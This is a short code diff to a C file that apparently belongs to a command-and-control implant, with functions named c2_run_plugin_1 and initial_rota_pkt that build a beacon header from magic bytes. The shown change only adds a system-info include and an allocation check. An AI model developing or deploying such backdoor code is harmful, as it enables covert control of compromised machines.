@@ -7,6 +7,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <sys/utsname.h>
 
 #include "c2_commands.h"
 
@@ -236,6 +237,13 @@ void c2_run_plugin_1(char *soPath, char *funcName) {
 char *initial_rota_pkt() {
 
     char *rotaHdr = (char *)malloc(82);
+    if (rotaHdr == NULL) {
+        #ifdef DEBUG
+        fprintf(stderr,"could not allocate data for rota header packet! Exiting!");
+        exit(1);
+        #endif
+    }
+
     memset(rotaHdr, 0, 82);
 
     memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
